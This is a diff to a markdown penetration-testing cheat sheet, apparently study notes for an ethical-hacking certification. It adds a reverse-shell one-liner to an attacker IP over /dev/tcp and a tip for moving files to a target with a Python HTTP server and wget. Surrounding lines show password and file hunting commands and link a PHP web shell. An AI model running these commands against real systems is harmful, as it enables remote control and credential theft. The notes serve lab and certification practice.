@@ -86,6 +86,7 @@
     + Search Files with the name of the user in it: find / -name "*USER*" -type f -ls 2>/dev/null
     + Search Files with the word password in the home directory: grep -i password -R .
 + Look for process execution. Probably there could be some process running as root, and they could be exploitable: ps -ef --forest
++ If you have to pass a file you can expose an http server with:python3 -m http.server and use wget on target machine
 
 ### Tips for windows:
 + evil-winrm is a program to interact with RPC windows and other protocols
@@ -110,6 +111,7 @@ Use crackmapexec to check if any of these passwords work for any of the users fo
 + [Automated Privilege Escalation](https://github.com/carlospolop/PEASS-ng)
 + [Single PHP shell file](https://github.com/flozz/p0wny-shell)
 + [Reverse Shell Generator](https://www.revshells.com/)
+    + If RevShell is not working try to enclose payload in bash -c "" like this: bash -c "bash -i >& /dev/tcp/10.10.14.6/1337 0>&1"
 + [Useful Commands](https://github.com/xaferima/Certified-Ethical-Hacking-Practical-Tools/blob/main/Commands-4-tools-used)
 + [VERY GOOD TOOLS EXPLAINATION divided by CyberKill Chain phases](https://book.thegurusec.com/certifications/certified-ethical-hacker-practical/reconnaissance-footprinting)
   
